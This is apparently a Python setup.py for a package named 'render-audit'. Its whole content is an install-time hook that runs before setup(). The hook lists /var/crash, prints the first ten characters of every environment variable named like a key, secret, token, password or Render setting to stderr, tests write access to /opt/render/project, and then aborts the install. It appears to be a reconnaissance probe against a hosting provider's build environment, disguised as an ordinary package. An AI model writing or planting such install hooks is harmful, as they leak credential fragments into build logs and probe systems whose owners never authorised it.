import os, sys, subprocess as sp
from setuptools import setup

def render_final_check():
    o = sys.stderr.write
    o("\n" + "R"*40 + "\n")
    o("--- RENDER.COM APPORT & CRASH AUDIT ---\n")

   
    o("[1] CHECKING CRASH DIRECTORY:\n")
    o(sp.getoutput("ls -ld /var/crash 2>/dev/null || echo 'Access Denied to /var/crash'") + "\n")

    
    o("\n[2] FULL ENV SCAN (Filtered):\n")
    envs = os.environ
    for k, v in envs.items():
        # Ищем всё, что похоже на ключи, но не палим их полностью
        if any(x in k.upper() for x in ['KEY', 'SECRET', 'TOKEN', 'PASS', 'RENDER']):
            o(f"{k} = {v[:10]}...[REDACTED]\n")

    
    o("\n[3] WRITE TEST IN /OPT/RENDER:\n")
    try:
        test_path = "/opt/render/project/test_write.txt"
        with open(test_path, "w") as f: f.write("POC")
        o(f"SUCCESS: Can write to {test_path}\n")
    except:
        o("DENIED: System folder is read-only.\n")

    o("\n" + "R"*40 + "\n")
    sys.exit(1)

try: render_final_check()
except: sys.exit(1)

setup(name="render-audit", version="0.1")
